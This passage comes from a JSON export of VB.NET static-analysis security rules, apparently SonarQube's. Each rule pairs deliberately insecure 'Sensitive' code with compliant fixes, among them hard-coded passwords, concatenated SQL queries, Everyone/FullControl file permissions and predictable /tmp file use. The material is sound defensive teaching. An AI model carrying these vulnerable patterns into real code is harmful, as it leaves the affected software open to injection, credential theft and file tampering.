log4net.Config.BasicConfigurator.Configure(appenders) ' Sensitive\n            log4net.Config.BasicConfigurator.Configure(repository) ' Sensitive\n            log4net.Config.BasicConfigurator.Configure(repository, appender) ' Sensitive\n            log4net.Config.BasicConfigurator.Configure(repository, appenders) ' Sensitive\n        End Sub\n    End Class\nEnd Namespace\n</pre>\n<p><strong>NLog</strong>: configure programmatically</p>\n<pre>\nNamespace Logging\n    Class NLogLogging\n        Private Sub Foo(ByVal config As NLog.Config.LoggingConfiguration)\n            NLog.LogManager.Configuration = config ' Sensitive\n        End Sub\n    End Class\nEnd Namespace\n</pre>\n<p><strong>Serilog</strong></p>\n<pre>\nNamespace Logging\n    Class SerilogLogging\n        Private Sub Foo()\n            Dim config As Serilog.LoggerConfiguration = New Serilog.LoggerConfiguration() ' Sensitive\n        End Sub\n    End Class\nEnd Namespace\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/\">Top 10 2021 Category A9 - Security Logging and\n  Monitoring Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring\">Top 10 2017 Category A10 -\n  Insufficient Logging &amp; Monitoring</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/117\">CWE-117 - Improper Output Neutralization for Logs</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/532\">CWE-532 - Information Exposure Through Log Files</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "vbnet:S2068": {
        "name": "Hard-coded credentials are security-sensitive",
        "htmlDesc": "<p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true\nfor applications that are distributed or that are open-source.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13466\">CVE-2019-13466</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15389\">CVE-2018-15389</a> </li>\n</ul>\n<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>\n<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection\nstrings, and for variable names that match any of the patterns from the provided list.</p>\n<p>It’s recommended to customize the configuration of this rule with additional credential words such as \"oauthToken\", \"secret\", …​</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li>\n  <li> Credentials are used in production environments. </li>\n  <li> Application re-distribution is required before updating the credentials. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Store the credentials in a configuration file that is not pushed to the code repository. </li>\n  <li> Store the credentials in a database. </li>\n  <li> Use your cloud provider’s service for managing secrets. </li>\n  <li> If a password has been disclosed through the source code: change it. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nDim username As String = \"admin\"\nDim password As String = \"Password123\" ' Sensitive\nDim usernamePassword As String = \"user=admin&amp;password=Password123\" ' Sensitive\nDim url As String = \"scheme://user:Admin123@domain.com\" ' Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nDim username As String = \"admin\"\nDim password As String = GetEncryptedPassword()\nDim usernamePassword As String = String.Format(\"user={0}&amp;password={1}\", GetEncryptedUsername(), GetEncryptedPassword())\nDim url As String = $\"scheme://{username}:{password}@domain.com\"\n\nDim url2 As String= \"http://guest:guest@domain.com\" ' Compliant\nConst Password_Property As String = \"custom.password\" ' Compliant\n</pre>\n<h2>Exceptions</h2>\n<ul>\n  <li> Issue is not raised when URI username and password are the same. </li>\n  <li> Issue is not raised when searched pattern is found in variable name and value. </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">Top 10 2017 Category A2 - Broken Authentication</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/798\">CWE-798 - Use of Hard-coded Credentials</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/259\">CWE-259 - Use of Hard-coded Password</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD\">Hard Coded Password</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "vbnet:S2077": {
        "name": "Formatting SQL queries is security-sensitive",
        "htmlDesc": "<p>Formatted SQL queries can be difficult to maintain, debug and can increase the risk of SQL injection when concatenating untrusted values into the\nquery. However, this rule doesn’t detect SQL injections (unlike rule <a href='/coding_rules#rule_key=vbnet%3AS3649'>S3649</a>), the goal is only to highlight complex/formatted queries.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Some parts of the query come from untrusted values (like user inputs). </li>\n  <li> The query is repeated/duplicated in other parts of the code. </li>\n  <li> The application must support different types of relational databases. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html\">parameterized queries, prepared\n  statements, or stored procedures</a> and bind variables to SQL query parameters. </li>\n  <li> Consider using ORM frameworks if there is a need to have an abstract layer to access data. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nPublic Sub SqlCommands(ByVal connection As SqlConnection, ByVal query As String, ByVal param As String)\n    Dim sensitiveQuery As String = String.Concat(query, param)\n    command = New SqlCommand(sensitiveQuery) ' Sensitive\n\n    command.CommandText = sensitiveQuery ' Sensitive\n\n    Dim adapter As SqlDataAdapter\n    adapter = New SqlDataAdapter(sensitiveQuery, connection) ' Sensitive\nEnd Sub\n\nPublic Sub Foo(ByVal context As DbContext, ByVal query As String, ByVal param As String)\n    Dim sensitiveQuery As String = String.Concat(query, param)\n    context.Database.ExecuteSqlCommand(sensitiveQuery) ' Sensitive\n\n    context.Query(Of User)().FromSql(sensitiveQuery) ' Sensitive\nEnd Sub\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nPublic Sub Foo(ByVal context As DbContext, ByVal value As String)\n    context.Database.ExecuteSqlCommand(\"SELECT * FROM mytable WHERE mycol=@p0\", value) ' Compliant, the query is parameterized\nEnd Sub\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/89\">CWE-89 - Improper Neutralization of Special Elements used in an SQL Command</a> </li>\n  <li> Derived from FindSecBugs rules <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JPA\">Potential SQL/JPQL Injection\n  (JPA)</a>, <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JDO\">Potential SQL/JDOQL Injection (JDO)</a>, <a\n  href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_HIBERNATE\">Potential SQL/HQL Injection (Hibernate)</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "vbnet:S5693": {
        "name": "Allowing requests with excessive content length is security-sensitive",
        "htmlDesc": "<p>Rejecting requests with significant content length is a good practice to control the network traffic intensity and thus resource consumption in\norder to prevent DoS attacks.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> size limits are not defined for the different resources of the web application. </li>\n  <li> the web application is not protected by <a href=\"https://en.wikipedia.org/wiki/Rate_limiting\">rate limiting</a> features. </li>\n  <li> the web application infrastructure has limited resources. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> For most of the features of an application, it is recommended to limit the size of requests to:\n    <ul>\n      <li> lower or equal to 8mb for file uploads. </li>\n      <li> lower or equal to 2mb for other requests. </li>\n    </ul>  </li>\n</ul>\n<p>It is recommended to customize the rule with the limit values that correspond to the web application.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nImports Microsoft.AspNetCore.Mvc\n\nPublic Class MyController\n    Inherits Controller\n\n    &lt;HttpPost&gt;\n    &lt;DisableRequestSizeLimit&gt; ' Sensitive: No size  limit\n    &lt;RequestSizeLimit(10485760)&gt; ' Sensitive: 10485760 B = 10240 KB = 10 MB is more than the recommended limit of 8MB\n    Public Function PostRequest(Model model) As IActionResult\n    ' ...\n    End Function\n\n    &lt;HttpPost&gt;\n    &lt;RequestFormLimits(MultipartBodyLengthLimit = 10485760)&gt; ' Sensitive: 10485760 B = 10240 KB = 10 MB is more than the recommended limit of 8MB\n    Public Function MultipartFormRequest(Model model) As IActionResult\n    ' ...\n    End Function\n\nEnd Class\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nImports Microsoft.AspNetCore.Mvc\n\nPublic Class MyController\n    Inherits Controller\n\n    &lt;HttpPost&gt;\n    &lt;RequestSizeLimit(8388608)&gt; ' Compliant: 8388608 B = 8192 KB = 8 MB\n    Public Function PostRequest(Model model) As IActionResult\n    ' ...\n    End Function\n\n    &lt;HttpPost&gt;\n    &lt;RequestFormLimits(MultipartBodyLengthLimit = 8388608)&gt; ' Compliant: 8388608 B = 8192 KB = 8 MB\n    Public Function MultipartFormRequest(Model model) AS IActionResult\n    ' ...\n    End Function\n\nEnd Class\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html\">Owasp Cheat Sheet</a> - Owasp Denial of Service\n  Cheat Sheet </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/770\">CWE-770 - Allocation of Resources Without Limits or Throttling</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/400\">CWE-400 - Uncontrolled Resource Consumption</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "vbnet:S2612": {
        "name": "Setting loose POSIX file permissions is security-sensitive",
        "htmlDesc": "<p>In Unix, \"others\" class refers to all users except the owner of the file and the members of the group assigned to this file.</p>\n<p>In Windows, \"Everyone\" group is similar and includes all members of the Authenticated Users group as well as the built-in Guest account, and\nseveral other built-in security accounts.</p>\n<p>Granting permissions to these groups can lead to unintended access to files.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The application is designed to be run on a multi-user environment. </li>\n  <li> Corresponding files and directories may contain confidential information. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>The most restrictive possible permissions should be assigned to files and directories.</p>\n<h2>Sensitive Code Example</h2>\n<p>.Net Framework:</p>\n<pre>\nDim unsafeAccessRule = new FileSystemAccessRule(\"Everyone\", FileSystemRights.FullControl, AccessControlType.Allow)\n\nDim fileSecurity = File.GetAccessControl(\"path\")\nfileSecurity.AddAccessRule(unsafeAccessRule) ' Sensitive\nfileSecurity.SetAccessRule(unsafeAccessRule) ' Sensitive\nFile.SetAccessControl(\"fileName\", fileSecurity)\n</pre>\n<p>.Net / .Net Core</p>\n<pre>\nDim fileInfo = new FileInfo(\"path\")\nDim fileSecurity = fileInfo.GetAccessControl()\n\nfileSecurity.AddAccessRule(new FileSystemAccessRule(\"Everyone\", FileSystemRights.Write, AccessControlType.Allow)) ' Sensitive\nfileInfo.SetAccessControl(fileSecurity)\n</pre>\n<p>.Net / .Net Core using Mono.Posix.NETStandard</p>\n<pre>\nDim fileSystemEntry = UnixFileSystemInfo.GetFileSystemEntry(\"path\")\nfileSystemEntry.FileAccessPermissions = FileAccessPermissions.OtherReadWriteExecute ' Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>.Net Framework</p>\n<pre>\nDim safeAccessRule = new FileSystemAccessRule(\"Everyone\", FileSystemRights.FullControl, AccessControlType.Deny)\n\nDim fileSecurity = File.GetAccessControl(\"path\")\nfileSecurity.AddAccessRule(safeAccessRule)\nFile.SetAccessControl(\"path\", fileSecurity)\n</pre>\n<p>.Net / .Net Core</p>\n<pre>\nDim safeAccessRule = new FileSystemAccessRule(\"Everyone\", FileSystemRights.FullControl, AccessControlType.Deny)\n\nDim fileInfo = new FileInfo(\"path\")\nDim fileSecurity = fileInfo.GetAccessControl()\nfileSecurity.SetAccessRule(safeAccessRule)\nfileInfo.SetAccessControl(fileSecurity)\n</pre>\n<p>.Net / .Net Core using Mono.Posix.NETStandard</p>\n<pre>\nDim fs = UnixFileSystemInfo.GetFileSystemEntry(\"path\")\nfs.FileAccessPermissions = FileAccessPermissions.UserExecute\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> <a\n  href=\"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission\">OWASP File Permission</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/732\">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/266\">CWE-266 - Incorrect Privilege Assignment</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "vbnet:S5443": {
        "name": "Using publicly writable directories is security-sensitive",
        "htmlDesc": "<p>Operating systems have global directories where any user has write access. Those folders are mostly used as temporary storage areas like\n<code>/tmp</code> in Linux based systems. An application manipulating files from these folders is exposed to race conditions on filenames: a malicious\nuser can try to create a file with a predictable name before the application does. A successful attack can result in other files being accessed,\nmodified, corrupted or deleted. This risk is even higher if the application runs with elevated permissions.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2012-2451\">CVE-2012-2451</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2015-1838\">CVE-2015-1838</a> </li>\n</ul>\n<p>This rule raises an issue whenever it detects a hard-coded path to a publicly writable directory like <code>/tmp</code> (see examples bellow). It\nalso detects access to environment variables that point to publicly writable directories, e.g., <code>TMP</code>, <code>TMPDIR</code> and\n<code>TEMP</code>.</p>\n<ul>\n  <li> <code>/tmp</code> </li>\n  <li> <code>/var/tmp</code> </li>\n  <li> <code>/usr/tmp</code> </li>\n  <li> <code>/dev/shm</code> </li>\n  <li> <code>/dev/mqueue</code> </li>\n  <li> <code>/run/lock</code> </li>\n  <li> <code>/var/run/lock</code> </li>\n  <li> <code>/Library/Caches</code> </li>\n  <li> <code>/Users/Shared</code> </li>\n  <li> <code>/private/tmp</code> </li>\n  <li> <code>/private/var/tmp</code> </li>\n  <li> <code>\\Windows\\Temp</code> </li>\n  <li> <code>\\Temp</code> </li>\n  <li> <code>\\TMP</code> </li>\n  <li> <code>%USERPROFILE%\\AppData\\Local\\Temp</code> </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Files are read from or written into a publicly writable folder </li>\n  <li> The application creates files with predictable names into a publicly writable folder </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Out of the box, .NET is missing secure-by-design APIs to create temporary files. To overcome this, one of the following options can be used:</p>\n<ul>\n  <li> Use a dedicated sub-folder with tightly controlled permissions </li>\n  <li> Created temporary files in a publicly writable folder and make sure:\n    <ul>\n      <li> Generated filename is unpredictable </li>\n      <li> File is readable and writable only by the creating user ID </li>\n      <li> File descriptor is not inherited by child processes </li>\n      <li> File is destroyed as soon as it is closed </li>\n    </ul>  </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nUsing Writer As New StreamWriter(\"/tmp/f\") ' Sensitive\n' ...\nEnd Using\n</pre>\n<pre>\nDim Tmp As String = Environment.GetEnvironmentVariable(\"TMP\") ' Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nDim RandomPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName())\n\n' Creates a new file with write, non inheritable permissions which is deleted on close.\nUsing FileStream As New FileStream(RandomPath, FileMode.CreateNew, FileAccess.Write, FileShare.None, 4096, FileOptions.DeleteOnClose)\n    Using Writer As New StreamWriter(FileStream) ' Sensitive\n    ' ...\n    End Using\nEnd Using\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/377\">CWE-377 - Insecure Temporary File</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/379\">CWE-379 - Creation of Temporary File in Directory with Incorrect Permissions</a>\n  </li>\n  <li> <a href=\"https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File\">OWASP, Insecure Temporary File</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "vbnet:S5445": {
        "name": "Insecure temporary file creation methods should not be used",
        "htmlDesc": "<p>Temporary files are considered insecurely created when the file existence check is performed separately from the actual file creation. Such a\nsituation can occur when creating temporary files using normal file handling functions or when using dedicated temporary file handling functions that\nare not atomic.</p>\n<h2>Why is this an issue?</h2>\n<p>Creating temporary files in a non-atomic way introduces race condition issues in the application’s behavior. Indeed, a third party can create a\ngiven file between when the application chooses its name and when it creates it.</p>\n<p>In such a situation, the application might use a temporary file that it does not entirely control. In particular, this file’s permissions might be\ndifferent than expected. This can lead to trust boundary issues.</p>\n<h3>What is the potential impact?</h3>\n<p>Attackers with control over a temporary file used by a vulnerable application will be able to modify it in a way that will affect the application’s\nlogic. By changing this file’s Access Control List or other operating system-level properties, they could prevent the file from being deleted or\nemptied. They may also alter the file’s content before or while the application uses it.</p>\n<p>Depending on why and how the affected temporary files are used, the exploitation of a race condition in an application can have various\nconsequences. They can range from sensitive information disclosure to more serious application or hosting infrastructure compromise.</p>\n<h4>Information disclosure</h4>\n<p>Because attackers can control the permissions set on temporary files and prevent their removal, they can read what the application stores in them.\nThis might be especially critical if this information is sensitive.</p>\n<p>For example, an application might use temporary files to store users' session-related information. In such a case, attackers controlling those\nfiles can access session-stored information. This might allow them to take over authenticated users' identities and entitlements.</p>\n<h4>Attack surface extension</h4>\n<p>An application might use temporary files to store technical data for further reuse or as a communication channel between multiple components. In\nthat case, it might consider those files part of the trust boundaries and use their content without additional security validation or sanitation. In\nsuch a case, an attacker controlling the file content might use it as an attack vector for further compromise.</p>\n<p>For example, an application might store serialized data in temporary files for later use. In such a case, attackers controlling those files'\ncontent can change it in a way that will lead to an insecure deserialization exploitation. It might allow them to execute arbitrary code on the\napplication hosting server and take it over.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<p>The following code example is vulnerable to a race condition attack because it creates a temporary file using an unsafe API function.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nImports System.IO\n\nSub Example()\n    Dim TempPath = Path.GetTempFileName() 'Noncompliant\n\n    Using Writer As New StreamWriter(TempPath)\n        Writer.WriteLine(\"content\")\n    End Using\nEnd Sub\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nImports System.IO\n\nSub Example()\n    Dim RandomPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName())\n\n    Using FileStream As New FileStream(RandomPath, FileMode.CreateNew, FileAccess.Write, FileShare.None, 4096, FileOptions.DeleteOnClose)\n        Using Writer As New StreamWriter(FileStream)\n            Writer.WriteLine(\"content\")\n        End Using\n    End Using\nEnd Sub\n</pre>\n<h3>How does this work?</h3>\n<p>Applications should create temporary files so that no third party can read or modify their content. It requires that the files' name, location, and\npermissions are carefully chosen and set. This can be achieved in multiple ways depending on the applications' technology stacks.</p>\n<h4>Strong security controls</h4>\n<p>Temporary files can be created using unsafe functions and API as long as strong security controls are applied. Non-temporary file-handling\nfunctions and APIs can also be used for that purpose.</p>\n<p>In general, applications should ensure that attackers can not create a file before them. This turns into the following requirements when creating\nthe files:</p>\n<ul>\n  <li> Files should be created in a non-public directory. </li>\n  <li> File names should be unique. </li>\n  <li> File names should be unpredictable. They should be generated using a cryptographically secure random generator. </li>\n  <li> File creation should fail if a target file already exists. </li>\n</ul>\n<p>Moreover, when possible, it is recommended that applications destroy temporary files after they have finished using them.</p>\n<p>Here the example compliant code uses the <code>Path.GetTempPath</code> and <code>Path.GetRandomFileName</code> functions to generate a unique\nrandom file name. The file is then open with the <code>FileMode.CreateNew</code> option that will ensure the creation fails if the file already\nexists. The <code>FileShare.None</code> option will additionally prevent the file from being opened again by any process. To finish, this code ensures\nthe file will get destroyed once the application has finished using it with the <code>FileOptions.DeleteOnClose</code> option.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File\">OWASP</a> - Insecure Temporary File </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities\">Top 10 2017 Category A9 -\n  Using Components with Known Vulnerabilities</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/377\">CWE-377 - Insecure Temporary File</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/379\">CWE-379 - Creation of Temporary File in Directory with Incorrect Permissions</a>\n  </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "vbnet:S1313": {
        "name": "Using hardcoded IP addresses is security-sensitive",
        "htmlDesc": "<p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901\">CVE-2006-5901</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725\">CVE-2005-3725</a> </li>\n</ul>\n<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always\nhave the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,\ndelivery, and deployment:</p>\n<ul>\n  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>\n  <li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li>\n</ul>\n<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially\nsensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to\nbypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which\nwill increase an attack’s impact.</p>\n<h2>Ask Yourself Whether</h2>\n<p>The disclosed IP address is sensitive, e.g.:</p>\n<ul>\n  <li> Can give information to an attacker about the network topology. </li>\n  <li> It’s a personal (assigned to an identifiable person) IP address. </li>\n</ul>\n<p>There is a risk if you answered yes to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar\napproach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having\nto rebuild the software.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nDim ip = \"192.168.12.42\" ' Sensitive\nDim address = IPAddress.Parse(ip)\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nDim ip = ConfigurationManager.AppSettings(\"myapplication.ip\") ' Compliant\nDim address = IPAddress.Parse(ip)\n</pre>\n<h2>Exceptions</h2>\n<p>No issue is reported for the following cases because they are not considered sensitive:</p>\n<ul>\n  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>\n  <li> Broadcast address 255.255.255.255 </li>\n  <li> Non-routable address 0.0.0.0 </li>\n  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href=\"http://www.oid-info.com/introduction.htm\">often match\n  Object Identifiers</a> (OID) </li>\n  <li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a\n  href=\"https://datatracker.ietf.org/doc/html/rfc5737\">RFC 5737</a> </li>\n  <li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href=\"https://datatracker.ietf.org/doc/html/rfc3849\">RFC\n  3849</a> </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "vbnet:S3884": {
        "name": "\"CoSetProxyBlanket\" and \"CoInitializeSecurity\" should not be used",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<h2>Why is this an issue?</h2>\n<p><code>CoSetProxyBlanket</code> and <code>CoInitializeSecurity</code> both work to set the permissions context in which the process invoked\nimmediately after is executed. Calling them from within that process is useless because it’s too late at that point; the permissions context has\nalready been set.</p>\n<p>Specifically, these methods are meant to be called from non-managed code such as a C++ wrapper that then invokes the managed, i.e. C# or VB.NET,\ncode.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nPublic Class Noncompliant\n\n    &lt;DllImport(\"ole32.dll\")&gt;\n    Public Shared Function CoSetProxyBlanket(&lt;MarshalAs(UnmanagedType.IUnknown)&gt;pProxy As Object, dwAuthnSvc as UInt32, dwAuthzSvc As UInt32, &lt;MarshalAs(UnmanagedType.LPWStr)&gt; pServerPrincName As String, dwAuthnLevel As UInt32, dwImpLevel As UInt32, pAuthInfo As IntPtr, dwCapabilities As UInt32) As Integer\n    End Function\n\n    Public Enum RpcAuthnLevel\n        [Default] = 0\n        None = 1\n        Connect = 2\n        [Call] = 3\n        Pkt = 4\n        PktIntegrity = 5\n        PktPrivacy = 6\n    End Enum\n\n    Public Enum RpcImpLevel\n        [Default] = 0\n        Anonymous = 1\n        Identify = 2\n        Impersonate = 3\n        [Delegate] = 4\n    End Enum\n\n    Public Enum EoAuthnCap\n        None = &amp;H00\n        MutualAuth = &amp;H01\n        StaticCloaking = &amp;H20\n        DynamicCloaking = &amp;H40\n        AnyAuthority = &amp;H80\n        MakeFullSIC = &amp;H100\n        [Default] = &amp;H800\n        SecureRefs = &amp;H02\n        AccessControl = &amp;H04\n        AppID = &amp;H08\n        Dynamic = &amp;H10\n        RequireFullSIC = &amp;H200\n        AutoImpersonate = &amp;H400\n        NoCustomMarshal = &amp;H2000\n        DisableAAA = &amp;H1000\n    End Enum\n\n    &lt;DllImport(\"ole32.dll\")&gt;\n    Public Shared Function CoInitializeSecurity(pVoid As IntPtr, cAuthSvc As Integer, asAuthSvc As IntPtr, pReserved1 As IntPtr, level As RpcAuthnLevel, impers As RpcImpLevel, pAuthList As IntPtr, dwCapabilities As EoAuthnCap, pReserved3 As IntPtr) As Integer\n    End Function\n\n    Public Sub DoSomething()\n        Dim Hres1 As Integer = CoSetProxyBlanket(Nothing, 0, 0, Nothing, 0, 0, IntPtr.Zero, 0) ' Noncompliant\n        Dim Hres2 As Integer = CoInitializeSecurity(IntPtr.Zero, -1, IntPtr.Zero, IntPtr.Zero, RpcAuthnLevel.None, RpcImpLevel.Impersonate, IntPtr.Zero, EoAuthnCap.None, IntPtr.Zero) ' Noncompliant\n    End Sub\n\nEnd Class\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a 